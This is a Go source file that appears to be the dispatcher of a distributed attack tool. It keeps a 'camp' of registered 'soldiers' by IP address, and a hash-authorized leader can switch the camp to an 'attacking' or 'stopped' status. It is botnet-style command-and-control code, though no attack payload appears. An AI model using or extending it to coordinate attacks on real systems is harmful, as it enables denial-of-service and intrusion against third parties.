package dispatcher

import (
	"encoding/json"
	"io"
	"net"
	"net/http"
)

func HandleCamp(writer http.ResponseWriter, request *http.Request, d *Dispatcher) {
	if request.Method == "GET" {
		err := json.NewEncoder(writer).Encode(d.cmp)
		if err != nil {
			http.Error(writer, err.Error(), http.StatusBadRequest)
			return
		}
	}
	if request.Method == "POST" {
		//add soldier to camp
		var soldier Soldier

		err := json.NewDecoder(request.Body).Decode(&soldier)
		if err != nil {
			http.Error(writer, err.Error(), http.StatusBadRequest)
			return
		}

		if d.cmp.SoldierExists(soldier.Name) {
			http.Error(writer, "Soldier already exists", http.StatusBadRequest)
			return
		}

		//set soldier ip
		ip, _, err := net.SplitHostPort(request.RemoteAddr)
		if err != nil {
			http.Error(writer, err.Error(), http.StatusBadRequest)
			return
		}
		soldier.Ip = ip
		d.cmp.AddSoldier(soldier)
		writer.WriteHeader(http.StatusOK)
	}
	if request.Method == "DELETE" {
		auth := request.Header.Get("Authorization")

		if isAuthorized(auth, d.cmp.Leader.AuthenticationHash) {
			//remove soldier from camp
			data, err := io.ReadAll(request.Body)
			if err != nil {
				http.Error(writer, err.Error(), http.StatusBadRequest)
				return
			}
			soldierName := string(data)

			if err != nil {
				http.Error(writer, err.Error(), http.StatusBadRequest)
				return
			}

			if !d.cmp.SoldierExists(soldierName) {
				http.Error(writer, "Soldier does not exist", http.StatusNotFound)
				return
			}

			d.cmp.RemoveSoldier(soldierName)
			writer.WriteHeader(http.StatusOK)

		} else {
			http.Error(writer, "Unauthorized", http.StatusUnauthorized)
			return
		}
	}

	// update camp status
	if request.Method == "PUT" {
		if isAuthorized(request.Header.Get("Authorization"), d.cmp.Leader.AuthenticationHash) {
			data, err := io.ReadAll(request.Body)
			if err != nil {
				http.Error(writer, err.Error(), http.StatusBadRequest)
				return
			}
			status := string(data)
			if status == STATUS_ATTACKING || status == STATUS_STOPPED {
				d.cmp.Status = status
				writer.WriteHeader(http.StatusOK)
			} else {
				http.Error(writer, "Invalid status", http.StatusBadRequest)
				return
			}
		} else {
			http.Error(writer, "Unauthorized", http.StatusUnauthorized)
			return
		}
	}
}

func isAuthorized(auth string, hash string) bool {
	if HashOf(auth) == hash {
		return true
	}
	return false
}

func Start(d *Dispatcher) {
	http.HandleFunc("/camp", func(writer http.ResponseWriter, request *http.Request) {
		HandleCamp(writer, request, d)
	})
	_ = http.ListenAndServe(d.ListeningAddress+":"+d.ListeningPort, nil)
}
